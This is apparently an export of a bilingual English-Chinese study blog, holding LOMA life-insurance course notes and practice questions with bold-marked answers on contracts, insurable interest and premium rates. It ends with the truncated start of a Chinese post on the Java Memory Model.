contract</li></ul></li><li>Legally adequate consideration: The parties must exchange <strong>consideration</strong>; each must give a promise or something of value to the other party.  法律上适当报价<ul><li>Applicant’s Consideration: Completed insurance application and the <strong>initial premium</strong> payment</li><li>Insurer’s Consideration: Promise to pay policy benefits if the conditions stated in the policy occur</li></ul></li><li>Lawful purpose is satisfied by the presence of <strong>insurable interest</strong> in the life of the insured 合法的目的<ul><li>Shown if the insured’s death creates a significant loss</li><li>Generally needed by the policyowner and the policy beneficiary; may be assumed because of <strong>bonds of affection or financial dependence</strong></li><li>Insurable interest must exist only <strong>at the time of policy issue</strong>.</li></ul></li><li>Contractual capacity 契约能力<ul><li>Contractual Capacity for Insurance Companies</li><li>Contractual Capacity for Individuals</li></ul></li></ul><hr><blockquote><p><strong>Insurable interest</strong> is the interest that an insurance policyowner or beneficiary has in the risk that is insured. A policyowner or beneficiary has an insurable interest if he is likely to suffer a genuine loss or detriment if the event insured against occurs.</p><p>可保利益是投保人或受益人对所投保的风险所具有的利益。如果投保人或受益人在保险事件发生时可能遭受真正的损失或损害，那么他就具有可保利益。</p><p><strong>Insurable Interest Relationships</strong>: The bonds of affection and financial dependence between certain family members are assumed by law to create an insurable interest between an insured and a policyowner or beneficiary.</p><p>Insurable interest is assumed for the insured’s spouse, child, parent, grandparent, grandchild, and sibling</p><p>可保利益亲属关系：法律规定，某些家庭成员之间的情感纽带和经济依赖关系在被保险人与投保人或受益人之间产生保险利益。</p><p>被保险人的配偶、子女、父母、祖父母、孙子女和兄弟姐妹享有保险权益</p><p><strong>Insurable Interest - Step Relative:</strong> When a policyowner or beneficiary is a step relative (stepfather, stepdaughter, etc.), distant relative, business partner, or friend, the bonds of affection and financial dependence may not be so clear.</p><p>可保利益继亲属关系：当投保人或受益人是继亲属（继父、继女等）、远房亲戚、商业伙伴或朋友时，感情和经济依赖的纽带可能并不那么明确。</p></blockquote><hr><blockquote><p><strong>Contractual Capacity for Insurance Companies:</strong></p><p>An insurance company acquires the contractual capacity to issue an insurance policy by being licensed or authorized to do business by the proper regulatory authority. A company that is not licensed or authorized does not have the legal capacity to make an insurance contract.</p><p>保险公司的合同能力：保险公司通过获得适当监管机构的许可或授权开展业务，获得签发保险单的合同能力。未经许可或授权的公司没有订立保险合同的法律能力。</p><p><strong>Contractual Capacity for Individuals:</strong></p><p>The law generally presumes that individuals who apply for insurance have the contractual capacity to enter into a contract. However, a lack of full contractual capacity is assumed when those individuals</p><ul><li>Are minors</li><li>If a minor is issued an insurance policy, the policy is <strong>voidable by the minor</strong>, which means that the minor can later decide to disaffirm the policy, and the insurer will have to return the premiums the minor paid for the policy.</li><li>Lack mental capacity</li><li>People who lack mental capacity (for example, declared insane or mentally incompetent by a court of law) or whose mental capacity is impaired (for example, intoxicated or mentally ill) typically do not have full contractual capacity.</li><li>A person without mental capacity cannot enter into a valid insurance contract. Thus, any <strong>such contract would be void</strong>. A person with impaired mental capacity is like a minor in that an impaired person who later regains competency may be able to avoid the insurance contract and receive a return of premiums.</li></ul><p>个人的合同能力：法律通常假定申请保险的个人具有订立合同的合同能力。然而，当这些人</p><ul><li><p>是未成年人</p></li><li><p>如果未成年人被签发了保险单，该保险单可由未成年人撤销，这意味着该未成年人稍后可以决定撤销该保险单，保险公司将不得不退还该未成年人为该保险单支付的保费。</p></li><li><p>缺乏心理能力</p></li><li><p>缺乏精神能力的人（例如，被法院宣布为精神错乱或精神无行为能力的人）或精神能力受损的人（如醉酒或精神病患者）通常没有完全的合同能力。</p></li><li><p>没有精神能力的人不能订立有效的保险合同。因此，任何此类合同都是无效的。精神能力受损的人就像未成年人一样，因为后来恢复能力的受损人可能能够逃避保险合同并获得保费回报。</p></li></ul></blockquote><h2 id="课后习题-2"><a href="#课后习题-2" class="headerlink" title="课后习题"></a>课后习题</h2><p>1.Because only the insurer makes a legally enforceable promise in a typical life insurance contract, the contract is an example of a (<strong>unilateral</strong>&#x2F;bilateral) contract. Because the policyowner exchanges something of value-the premium-for the insurer’s conditional promise to pay benefits if the insured dies while the policy is in force, a life insurance contract is an example of (a commutative&#x2F;<strong>an aleatory</strong>) contract.</p><blockquote><p>因为在典型的人寿保险合同中，只有保险人做出了可依法执行的承诺，所以该合同是单方面合同的一个例子。因为投保人用有价值的保险费来换取保险人有条件的承诺，如果被保险人在保单有效期间死亡，保险人将支付保险金，所以人寿保险合同就是可选择性合同的一个例子。</p></blockquote><p>2.Lila Tabak is the policyowner-insured of a life insurance contract with the EIM Insurance Company. The following statement(s) can correctly be made about this insurance contract: </p><p>A. Ms. Tabak’s contract with Elm is an example of a formal, rather than an informal, contract.<br>B. If any provision in this contract is ambiguous, the courts most likely will interpret that provision against Elm.</p><ul><li>Both A and B </li><li>A only</li><li><strong>B only</strong> </li><li>Neither A nor B</li></ul><blockquote><p>Lila Tabak是EIM保险公司人寿保险合同的投保人。关于本保险合同，可以正确地作出以下声明：</p><p>A.塔巴克女士与ElM签订的合同是一份正式合同，而非非正式合同。</p><p>B.如果本合同中的任何条款不明确，法院很可能会对Elm不利地解释该条款。</p><ul><li><p>A和B</p></li><li><p>仅A</p></li><li><p>仅限B</p></li><li><p>既不是A也不是B</p></li></ul></blockquote><p>3.The following information describes two contracts:</p><ul><li>Contract A-one of the parties has the legal right to reject her obligations under the contract without incurring legal liability <strong>[voidable]</strong></li><li>Contract B-does not meet one of the legal requirements to create a legally enforceable contract <strong>[void]</strong></li></ul><blockquote><p>以下信息描述了两个合同：</p><ul><li><p>合同A—一方有权拒绝履行其在合同项下的义务，而无需承担法律责任**[可撤销]**</p></li><li><p>合同B不符合创建具有法律效力的合同的法律要求**[无效]**</p></li></ul></blockquote><p>4.When Pam Store applied for a life insurance policy from the Birch Insurance Company, she submitted legally adequate consideration for the policy. This consideration most likely consisted of </p><ul><li>a completed insurance application, the initial premium payment, and a promise to pay all renewal premiums </li><li><strong>a completed insurance application and the initial premium payment only</strong></li><li>the initial premium payment and a promise to pay all renewal premiums only </li><li>the completed insurance application only</li></ul><blockquote><p>当Pam Storr向Birch保险公司申请人寿保险时，她提交了法律上充分的对价。这种考虑很可能包括</p><ul><li><p>已完成的保险申请、首次保费支付以及支付所有续保保费的承诺</p></li><li><p>已完成的保险申请和首次保费支付</p></li><li><p>首次保费支付和仅支付所有续保保费的承诺</p></li><li><p>仅填写完整的保险申请</p></li></ul></blockquote><p>5.The bonds of affection and financial dependence between certain family members are assumed by law to create an insurable interest between an insured and a policyowner or beneficiary. All of the following individuals generally would be presumed to automatically satisfy the insurable interest requirement EXCEPT for an insured’s </p><ul><li>spouse </li><li>brother </li><li>grandmother </li><li><strong>cousin</strong></li></ul><blockquote><p>法律认为，某些家庭成员之间的情感纽带和经济依赖关系在被保险人和投保人或受益人之间产生了可保利益。除被保险人的</p><ul><li><p>配偶</p></li><li><p>兄弟</p></li><li><p>祖母</p></li><li><p>表亲</p></li></ul></blockquote><p>6.The following statements are about contractual capacity in the formation of insurance contracts. Select the answer choice containing the correct statement.</p><ul><li><strong>An insurer acquires its legal capacity to issue an insurance contract by being licensed or authorized to do business by the proper regulatory authority.</strong></li><li>If an insurer issues a policy to a person who is younger than the permissible age to purchase insurance, the insurer can avoid the policy.</li><li>An insurance contract entered into by a person when the person’s mental competence is impaired, but who has not been declared insane or mentally incompetent by a court, is a valid contract.</li><li>An insurance contract entered into by a person after a court has declared the person to be insane or mentally incompetent is a voidable contract.</li></ul><blockquote><p>以下是关于保险合同订立中的合同能力的陈述。选择包含正确陈述的答案。</p><ul><li><p>保险人通过获得适当监管机构的许可或授权开展业务，获得了签发保险合同的法律能力</p></li><li><p>如果保险公司向低于允许购买保险年龄的人签发保单，保险公司可以回避该保单。</p></li><li><p>当一个人的精神能力受到损害，但没有被法院宣布为精神失常或精神无行为能力时，该人签订的保险合同是有效的合同。</p></li><li><p>一个人在法院宣布其精神失常或无行为能力后订立的保险合同是可撤销的合同。</p></li></ul></blockquote><h1 id="Lesson-4"><a href="#Lesson-4" class="headerlink" title="Lesson 4"></a>Lesson 4</h1><h2 id="Actuaries-and-Premium-Rates【精算师和保险费率】"><a href="#Actuaries-and-Premium-Rates【精算师和保险费率】" class="headerlink" title="Actuaries and Premium Rates【精算师和保险费率】"></a><strong>Actuaries and Premium Rates【精算师和保险费率】</strong></h2><p>In an insurance transaction, the policyowner pays premiums to the insurer in exchange for the insurer’s promise to pay benefits when they become due.</p><p>• For the customer, <strong>the value of the exchange</strong> is the opportunity to transfer risk to the insurer and gain peace of mind.</p><p>• For the insurer, <strong>the value of the exchange</strong> is the opportunity to collect premiums and grow the company’s business.</p><hr><p>精算师<strong>Actuaries</strong> specialize in calculating the financial impact of risk and uncertainty. They rely on the mathematics of insurance to determine how much insurers should charge customers so that the company can</p><ul><li>Pay all future benefits 支付所有未来福利</li><li>Cover operating expenses 支付运营费用</li><li>Make a reasonable profit 赚取合理利润</li></ul><p>Actuaries determine <strong>premium rates</strong> per unit of coverage. These rates must be</p><ul><li><p><strong>Adequate:</strong> The company will have enough money to pay policy benefits. 足够的</p></li><li><p><strong>Equitable:</strong> Each policyowner pays a premium that reflects the degree of risk he presents to the insurer 公平的</p></li></ul><p><strong>Developing Premium Rates【制定保险费率】</strong></p><p>To determine adequate and equitable premium rates, actuaries take into account </p><ul><li><p>the cost of benefits 福利成本</p><ul><li>The <strong>cost of benefits</strong> equals all of the insurer’s potential benefit payments multiplied by the expected probability that each benefit will be payable. 福利成本等于保险人的所有潜在福利付款乘以每项福利应支付的预期概率。</li><li>Mortality rate, cost of benefits, and premium rate all move in the same direction. As the mortality rate rises, so do the cost of benefits and the premium rate. 死亡率、福利成本和保险费率都朝着同一个方向发展。随着死亡率的上升，福利成本和保险费率也在上升。</li><li>Death benefits payable when the insured dies. Death benefits are based on<strong>mortality rates.</strong> 被保险人死亡时应支付的身故保险金。死亡抚恤金基于死亡率。</li><li>Surrender benefits payable when a policyowner surrenders a policy for its cash surrender value. Surrender benefits and costs of lapses are based on **lapse rates. **当保单持有人为其现金退保价值而放弃保单时，应支付的退保福利。退保福利和失效成本（没有现金价值）基于失效率。</li></ul></li><li><p>investment earnings 投资收益</p><ul><li>The principal is the sum of money originally invested, loaned, or borrowed. 本金是最初投资、借出或借来的钱的总和。</li><li>Simple interest is interest on the original principal only. 单利是对原始本金的利息。</li><li>Interest on both the principal and the accrued interest is called compound interest. 本金和应计利息的利息叫做复利。</li></ul></li><li><p>operating expenses 营业费用</p><ul><li>Taxes, licenses, and fees 税收、执照和费用</li><li>Salaries and commissions 工资和佣金</li><li>Costs associated with developing new products 与开发新产品相关的成本</li><li>Costs associated with operating and maintaining the home office, regional offices, and&#x2F;or sales offices 与运营和维护总部、区域办事处和&#x2F;或销售办事处相关的成本</li></ul></li><li><p>profit 利润</p></li></ul><blockquote><p>The <strong>lapse rate</strong> represents the annual percentage of policies that don’t remain in force until the end of a given policy year because the policyowner stops paying premiums. </p><p>失效率是指由于投保人停止支付保险费而在特定保险年度结束前失效的保险的年百分比。</p><p>The <strong>mortality rate</strong> reflects how many people in a group will die at each age.</p><p>死亡率反映了一个群体在每个年龄段会有多少人死亡。</p></blockquote><h2 id="Investment-Earnings-and-Pricing-Products【投资收益和定价产品】"><a href="#Investment-Earnings-and-Pricing-Products【投资收益和定价产品】" class="headerlink" title="Investment Earnings and Pricing Products【投资收益和定价产品】"></a><strong>Investment Earnings and Pricing Products【投资收益和定价产品】</strong></h2><p><strong>Simple interest</strong> is interest on the original principal only.</p><p>Example: Luther Odom loaned Peggy Sims $1,000 for one year at an annual interest rate of 10 percent. A 10 percent interest rate on a loan indicates that the borrower must pay the lender the amount originally borrowed, plus an additional 10 percent of that amount.</p><p>Analysis: At the end of one year, Peggy owed Luther $1,100: the $1,000 Luther loaned Peggy originally plus $100 interest ($1,000 x 0.10 &#x3D; $100).</p><blockquote><p>单利仅为原始本金的利息。</p><p>实例：卢瑟·奥多姆以10%的年利率借给佩吉·西姆斯1000美元，为期一年。贷款利率为10%表示借款人必须向贷款人支付最初借款的金额，再加上该金额的10%。</p><p>分析：一年结束时，佩吉欠路德1100美元：路德最初借给佩吉的1000美元加上100美元的利息（1000美元x 0.10&#x3D;100美元）。</p></blockquote><p>Interest on both the principal and the accrued interest is called <strong>compound interest</strong>.</p><p>Example: Marcia Woodson loaned Bernard Carter $1,000 at an annual interest rate of 10 percent. Bernard did not repay any of the principal or interest on the loan for two years.</p><p>Analysis:</p><p>At the end of the first year, Bernard owed Marcia $1,100, calculated as</p><p><code>$1,000 principal + ($1,000 principal x 0.10) = $1,100</code></p><p>At the end of the second year, Bernard owed Marcia $110 in interest, calculated as</p><p><code>$1,100 principal and accrued interest x 0.10 = $110</code></p><p>Thus, at the end of the second year, Bernard owed Marcia a total of $1,210, calculated as</p><p><code>$1,100 + $110 = $1,210</code></p><blockquote><p>本金和应计利息的利息称为<strong>复利</strong>。</p><p>例如：Marcia Woodson以10%的年利率借给Bernard Carter 1000美元。Bernard在两年内没有偿还任何贷款本金或利息。</p><p>分析：</p><p>第一年年底，Bernard欠Marcia 1100美元，按</p><p><code>1000美元本金+（1000美元本金x 0.10）=1100美元</code></p><p>第二年年底，Bernard欠Marcia 110美元的利息，按</p><p><code>1100美元本金和应计利息x 0.10=110美元</code></p><p>因此，在第二年年底，Bernard总共欠Marcia 1210美元，计算如下</p><p><code>1100美元+110美元=1210美元</code></p></blockquote><h2 id="课后习题-3"><a href="#课后习题-3" class="headerlink" title="课后习题"></a>课后习题</h2><p>1.To develop adequate and equitable premium rates, actuaries take into account the following factors: </p><p>A. Cost of benefits </p><p>B. Investment earnings </p><p>C. Operating expenses </p><p>D. Profit </p><ul><li><strong>A,B,C, and D</strong> </li><li>A,B, and C only </li><li>A,C, and D only </li><li>B and D only</li></ul><blockquote><p>1.为了制定适当和公平的保险费率，精算师会考虑以下因素：</p><p>A.福利成本</p><p>B.投资收益</p><p>C.营业费用</p><p>D.利润</p><ul><li><p><strong>A、B、C和D</strong></p></li><li><p>仅限A、B和C</p></li><li><p>仅限A、C和D</p></li><li><p>仅限B和D</p></li></ul></blockquote><p>2.Kay Vale is a 32-year-old proposed insured whose likelihood of loss is significantly greater thin average but is still insurable. Ms. Vale applied for $150,000 of life insurance coverage with the Red Insurance Company. Red would charge the following premium rates for a 32-year-old woman based on her risk class:</p><ol><li><p>$1.25 per $1,000 of coverage for preferred risks</p></li><li><p>$2.00 per $1,000 of coverage for standard risks</p></li><li><p>$3.25 per $1,000 of coverage for substandard risks</p></li></ol><p>This information indicates that Ms. Vale’s annual premium amount will be</p><ul><li>$150.00</li><li>$187.50</li><li>$300.00</li><li><strong>$487.50</strong></li></ul><blockquote><p>Kay Vale是一名32岁的拟投保人，其损失可能性明显高于平均水平，但仍可投保。Vale女士向Red Insurance公司申请了150000美元的人寿保险。Red将根据32岁妇女的风险等级收取以下保费：</p><p>1.优先风险的保险范围为每1000美元1.25美元</p><p>2.标准风险的保险范围为每1000美元2.00美元</p><p>3.不合格风险的保险范围为每1000美元3.25美元</p><p>该信息表明，Vale女士的年度保费金额为</p><ul><li><p>150.00美元</p></li><li><p>187.50美元</p></li><li><p>300.00美元</p></li><li><p><strong>487.50美元</strong></p></li></ul></blockquote><p>3.Actuaries at the Retreat Insurance Company are developing a new term life insurance product. They project that 5 of each 1,000 insureds will die before the end of the product’s first year. If the actuaries had projected that 7 out of each 1000 insureds would die before the end of the product’s first year, then the projected cost of benefits for this product would be (lower &#x2F; <strong>higher</strong>).thereby allowing their coverage to terminate. For this product’s second year, the (<strong>lapse</strong> &#x2F; surrender) rate is They also project that 120 of each 1,000 insureds will not pay the second year’s premium expected to be 12%.</p><blockquote><p>Retreat保险公司的精算师正在开发一种新的定期人寿保险产品。他们预计，每1000名被保险人中就有5人将在产品的第一年结束前死亡。如果实际情况预测，每1000名被保险人中就有7人将在产品的第一年结束前死亡，那么该产品的预计福利成本将为（较低&#x2F;<strong>较高</strong>）。从而允许他们的保险范围终止。对于该产品的第二年，（<strong>失效</strong>&#x2F;退保）率为。他们还预测，每1000名被保险人中有120人将不会支付第二年预计为12%的保费。</p></blockquote><p>4.The following statements can correctly be made about the relationship between mortality rates and premium rates for a block of Life insurance policies:</p><p>A.  An insurer applies different premium rates to insureds who fit into the same block of policies</p><p>B.  Generally, the lower the mortality rate, the lower the cost of benefits and premium rate.</p><ul><li>Both A and B</li><li>A only</li><li><strong>B only</strong></li><li>Neither A nor B</li></ul><blockquote><p>以下陈述可以纠正一组人寿保险单的死亡率和保险费率之间的关系：</p><p>A.保险公司对符合同一保单组的被保险人适用不同的保险费率</p><p>B.一般来说，死亡率越低，福利成本和保险费率就越低。</p><ul><li><p>A和B</p></li><li><p>仅A</p></li><li><p><strong>仅限B</strong></p></li><li><p>既不是A也不是B</p></li></ul></blockquote><p>5.Ron Houk loaned 510,00 to his lister, Fona Wymn. Mr. Houk charged his sister a 5% interest rate, compounded annually. At the end of two years, Ms. Wymn wanted to pay back the entire loan plus the total interest accrued on the loan. This information indicates that Ms. Wynn should pay Mr. Houk a total of</p><ul><li>$10,000</li><li>$10,500</li><li>$10,525</li><li><strong>$11,025</strong></li></ul><blockquote><p>罗恩·霍克借了510,00给他的经纪人Fona Wmn。欧向他的妹妹收取5%的利息，并以大赦的形式复利。两年结束时，Wmn女士想向巴德支付全部贷款加上贷款的总利息。该信息表明，Wynn女士应向Houk先生支付总计</p><ul><li><p>10000美元</p></li><li><p>10500美元</p></li><li><p>10525美元</p></li><li><p><strong>11025美元</strong></p></li></ul></blockquote><p>6.The Misty Insurance Company noted the following results on a block of life insurance policies, compared to what Misty had assumed when Misty originally priced the block of policies:</p><ol><li>Result A-Operating expenses were higher</li><li>Result B-Investment earnings were higher</li><li>Result C-Mortality experience was lower</li></ol><p>Of these results, those that would tend to increase Misty’s profits include </p><ul><li><p>all of these results </p></li><li><p>Result A and Result B only </p></li><li><p><strong>Result B and Result C only</strong> </p></li><li><p>Result C only</p></li></ul><blockquote><p>Misty保险公司注意到，与Misty最初为保单定价时的假设相比，一组人寿保险单的结果如下：</p><ol><li><p>结果A-运营费用较高</p></li><li><p>结果B-投资收益更高</p></li><li><p>结果C-死亡率经验较低。</p></li></ol><p>在这些结果中，那些倾向于增加Misty利润的结果包括</p><ul><li><p>所有这些结果</p></li><li><p>仅结果A和结果B</p></li><li><p><strong>仅结果B和结果C</strong></p></li><li><p>仅结果C</p></li></ul></blockquote><h1 id="考试"><a href="#考试" class="headerlink" title="考试"></a>考试</h1><p>1.The Chetola Insurance Company noted the following results on a block of insurance policies</p><p>Result A: Investment earnings were higher than Chetola had assumed when it priced the block of policies</p><p>Result B: Mortality experience was lower than Chetola had assumed when it priced the block of policies.</p><p>Result C: Operating expenses were lower than Chetola had assumed when it priced the block of policies.</p><p>Chetola’s profits likely increased because of</p><ul><li><strong>all of these results</strong></li><li>Result A and Result C only</li><li>Result B and Result C only</li><li>Result C only</li></ul><blockquote><p>Chetola保险公司注意到一组保单的结果如下</p><p>结果A：投资收益高于Chetola对保单定价时的假设</p><p>结果B：死亡率经验低于Chetola在对政策块进行定价时的假设。</p><p>结果C：运营费用低于Chetola为保单定价时的假设。</p><p>Chetola的利润可能因此增长</p><ul><li><p>所有这些结果</p></li><li><p>仅结果A和结果C</p></li><li><p>仅结果B和结果C</p></li><li><p>仅结果C</p></li></ul></blockquote><p>2.Life insurance companies usually identify at least four risk classes for proposed insureds: standard risks, preferred risks, substandard risks, and declined risks. A proposed insured for life insurance who presents a significantly lower-than-average likelihood of loss typically is classified as a </p><ul><li><strong>preferred risk and charged a lower-than-standard premium rate</strong> </li><li>standard risk and charged a standard premium rate </li><li>substandard risk and charged a higher-than-standard premium rate</li><li>declined risk and denied the requested life insurance coverage</li></ul><blockquote><p>人寿保险公司通常为被保险人确定至少四种风险类别：标准风险、首选风险、不合标准风险和拒绝风险。人寿保险的拟议被保险人，其损失可能性明显低于平均水平，通常被归类为</p><ul><li><p>优先风险，并收取低于标准的保险费率</p></li><li><p>标准风险并收取标准保险费率</p></li><li><p>低于标准的风险并收取高于标准的保险费率</p></li><li><p>拒绝风险并拒绝所要求的人寿保险</p></li></ul></blockquote><p>3.Nicole Dior is the policyowner-insured of a $250,000 term life insurance policy. Because Ms. Dior’s policy specifies the amount of the benefit payable should she die while the coverage is in force, her life insurance policy is a type of contract known as a</p><ul><li>voidable contract</li><li>void contract</li><li>contract of indemnity</li><li><strong>valued contract</strong></li></ul><blockquote><p>妮可·迪奥是一份价值25万美元的定期人寿保险的投保人。由于迪奥女士的保单规定了在保险有效期内死亡时应支付的福利金额，她的人寿保险单是一种被称为</p><ul><li><p>可撤销合同</p></li><li><p>无效合同</p></li><li><p>赔偿合同</p></li><li><p>有价合同</p></li></ul></blockquote><p>4.Risks can be classified as either speculative risks or pure risks. The type of risk that can be insured is a </p><ul><li><p>pure risk, which is a risk that involves either a loss, a gain, or no change </p></li><li><p><strong>pure risk, which is a risk that involves either a loss or no loss</strong> </p></li><li><p>speculative risk, which is a risk that involves either a loss, a gain, or no change </p></li><li><p>speculative risk, which is a risk that involves either a loss or no loss</p></li></ul><blockquote><p>风险可分为投机风险或纯粹风险。可以投保的风险类型是</p><ul><li><p>纯粹风险，是指损失、收益或没有变化的风险</p></li><li><p>纯粹风险，即涉及损失或无损失的风险</p></li><li><p>投机风险，这是一种涉及损失、收益或没有变化的风险</p></li><li><p>投机风险，这是一种涉及损失或无损失的风险</p></li></ul></blockquote><p>5.Nancy Xiong is an underwriter for the Limelight Insurance Company. As an underwriter, Ms. Xiong primarily is responsible for </p><ul><li><p>setting the premium rates for Limelight’s insurance products </p></li><li><p>evaluating claims submitted by Limelight’s customers </p></li><li><p><strong>evaluating proposed risks for Limelight’s insurance products</strong> </p></li><li><p>submitting financial statements to Limelight’s regulators</p></li></ul><blockquote><p>熊是黎明保险公司的保险人。作为承销商，熊女士主要负责</p><ul><li><p>设定Limelight保险产品的保险费率</p></li><li><p>评估Limelight客户提交的索赔</p></li><li><p>评估Limelight保险产品的拟议风险</p></li><li><p>向Limelight监管机构提交财务报表</p></li></ul></blockquote><p>6.When Patrick Bergeron applied for a life insurance policy from the McAvoy Insurance Company, he submitted legally adequate consideration for the policy. This consideration most likely consisted of </p><ul><li><p>a completed insurance application, the initial premium payment, and a promise to pay all renewal premiums </p></li><li><p>the initial premium payment and a promise to pay all renewal premiums only</p></li><li><p><strong>a completed insurance application and the initial premium payment only</strong> </p></li><li><p>a completed insurance application only</p></li></ul><blockquote><p>当Patrick Bergeron向McAvoy保险公司申请人寿保险时，他为该保单提交了法律上充分的对价。这种考虑很可能包括</p><ul><li><p>已完成的保险申请、首次保费支付以及支付所有续保保费的承诺</p></li><li><p>首次保费支付和仅支付所有续保保费的承诺</p></li><li><p><strong>已完成的保险申请和首次保费支付</strong></p></li><li><p>仅填写完整的保险申请</p></li></ul></blockquote><p>7.In the United States, insurance is primarily regulated by the </p><ul><li>federal government </li><li>Securities and Exchange Commission(SEC)</li><li>Financial Industry Regulatory Authority(FINRA)</li><li><strong>state governments</strong></li></ul><blockquote><p>在美国，保险主要由</p><ul><li><p>联邦政府</p></li><li><p>美国证券交易委员会</p></li><li><p>金融业监管局</p></li><li><p>州政府</p></li></ul></blockquote><p>8.Mortality rates affect premium rates and the cost of benefits for a block of life insurance policies. With respect to the difference between the mortality rates of men and women of the same age, mortality tables show that(<strong>women</strong> &#x2F;men) live longer and thus are charged lower premium rates for equivalent life insurance policies. In general, the higher the mortality rate for a group of insureds of the same age and sex, the (<strong>higher</strong> &#x2F;lower) the cost of benefits and the premium rate.</p><blockquote><p>死亡率影响一组人寿保险单的保险费率和福利成本。关于同龄男性和女性死亡率之间的差异，死亡率表显示，（<strong>女性</strong>&#x2F;男性）寿命更长，因此同等人寿保险的保费更低。一般来说，一组年龄和性别相同的被保险人的死亡率越高，福利成本和保险费率就越高。</p></blockquote><p>9.Brock Mutual Company is organized as a mutual insurer. As a mutual insurer, Brock most likely </p><ul><li>is a non-profit organization</li><li><strong>is owned by its policyowners</strong></li><li>operates through a lodge system </li><li>has stockholders who have voting rights in Brock</li></ul><blockquote><p>布洛克互惠保险公司是作为一家共同保险公司成立的。作为共同保险人，Brock很可能</p><ul><li><p>是一个非营利组织</p></li><li><p>由保单持有人所有</p></li><li><p>通过兄弟会运行</p></li><li><p>在布洛克拥有投票权的股东</p></li></ul></blockquote><p>10.The different categories of contracts include commutative contracts, bargaining contracts, formal contracts, and unilateral contracts. When Shelby Miller purchased a life insurance policy from the Meadowwiew Insurance Company, she entered into the type of contract known as a</p><ul><li>commutative contract, because Ms. Miller and Meadowiew have agreed to exchange items or services that are equal in value </li><li>bargaining contract, because Ms. Miller and Meadowwiew, as equals, set the terms and conditions of the contract</li><li>formal contract, because Ms. Miller and Meadowwiew met certain formalities concerning the form of the agreement between them </li><li><strong>unilateral contract, because only Meadowwiew made a promise that is legally enforceable</strong></li></ul><blockquote><p>不同类别的合同包括交换合同、议价合同、正式合同和单方面合同。当Shelby Miller从Meadowwiew保险公司购买人寿保险时，她签订了一份被称为</p><ul><li><p>交换合同，因为Miller女士和Meadowiew已经同意交换价值相等的物品或服务</p></li><li><p>谈判合同，因为Mller女士和Meadowwiew平等地设定了合同的条款和条件</p></li><li><p>正式合同，因为Miller女士和Meadowwiew满足了关于他们之间协议形式的某些手续</p></li><li><p>单方面合同，因为只有Meadowwiew做出了法律上可执行的承诺</p></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> Loma </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Loma </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java内存模型之JMM</title>
      <link href="/posts/60642/"/>
      <url>/posts/60642/</url>
      
        <content type="html"><![CDATA[<h1 id="计算机硬件存储体系"><a href="#计算机硬件存储体系" class="headerlink" title="计算机硬件存储体系"></a>计算机硬件存储体系</h1><p> 计算机存储结构，从本地磁盘到主存再到CPU缓存，也就是从硬盘到内存再到CPU。一般对应的程序的操作就是从数据库查数据到内存然后到CPU进行计算。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20221016224559.png"></p><p>因为有这么多级的缓存(cpu和物理主内存的速度不一致的)，CPU的运行并<strong>不是直接操作内存而是先把内存里边的数据读到缓存</strong>，而内存的读和写操作的时候就会造成<strong>不一致</strong>的问题。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20221016224708.png"></p><p>Java虚拟机规范中试图定义一种Java内存模型（Java Memory Model，简称JMM) 来<strong>屏蔽掉各种硬件和操作系统的内存访问差异</strong>，以实现让Java程序在各种平台下都能达到一致的内存访问效果。</p><h1 id="Java内存模型Java-Memory-Model"><a href="#Java内存模型Java-Memory-Model" class="headerlink" title="Java内存模型Java Memory Model"></a>Java内存模型Java Memory Model</h1><p>JMM(Java内存模型Java Memory Model，简称JMM)本身是一种<strong>抽象</strong>的概念，并不真实存在，它仅仅描述的是一组<strong>约定或规范</strong>，通过这组规范定义了程序中(尤其是多线程)各个变量的读写访问方式，并决定一个线程对共享变量的写入何时以及如何变成对另一个线程可见，关键技术点都是围绕多线程的原子性、可见性和有序性展开的。</p><p>原则：</p><ul><li>JMM的关键技术点都是围绕多线程的<strong>原子性、可见性和有序性</strong>展开的</li></ul><p>能干嘛？</p><ul><li>通过JMM来实现线程和主内存之间的抽象关系。</li><li>屏蔽各个硬件平台和操作系统的<strong>内存访问差异</strong>以实现让Java程序在各种平台下都能达到一致的内存访问效果。</li></ul><h1 id="JMM规范下的三大特性"><a href="#JMM规范下的三大特性" class="headerlink" title="JMM规范下的三大特性"></a>JMM规范下的三大特性</h1><h2 id="可见性"><a href="#可见性" class="headerlink" title="可见性"></a>可见性</h2><p>是指<strong>当一个线程修改了某一个共享变量的值，其他线程是否能够立即知道该变更</strong> ，JMM规定了所有的变量都存储在<strong>主内存</strong>中。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20221016225810.png"></p><ul><li><p>Java中<strong>普通的共享变量不保证可见性</strong>，因为数据修改被写入内存的时机是不确定的，多线程并发下很可能出现”脏读”。</p></li><li><p>所以<strong>每个线程都有自己的工作内存</strong>，线程自己的工作内存中保存了该线程使用到的变量的<strong>主内存副本拷贝</strong>，线程对变量的所有操作（读取，赋值等 ）都必需在线程自己的工作内存中进行，而不能够直接读写主内存中的变量。</p></li><li><p>不同线程之间也无法直接访问对方工作内存中的变量，线程间变量值的传递均需要通过主内存来完成</p></li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20221016224708.png"></p><p>如果没有保证可见性，导致线程脏读例子：</p><ol><li>主内存中有变量 x，初始值为 0</li><li>线程 A 要将 x 加 1，先将 x&#x3D;0 拷贝到自己的私有内存中，然后更新 x 的值</li><li>线程 A 将更新后的 x 值回刷到主内存的时间是不固定的</li><li>刚好在线程 A 没有回刷 x 到主内存时，线程 B 同样从主内存中读取 x，此时为 0，和线程 A 一样的操作，最后期盼的 x&#x3D;2 就会变成 x&#x3D;1</li></ol><h2 id="原子性"><a href="#原子性" class="headerlink" title="原子性"></a>原子性</h2><p>指一个操作是不可中断的，即多线程环境下，操作不能被其他线程干扰。</p><h2 id="有序性"><a href="#有序性" class="headerlink" title="有序性"></a>有序性</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td 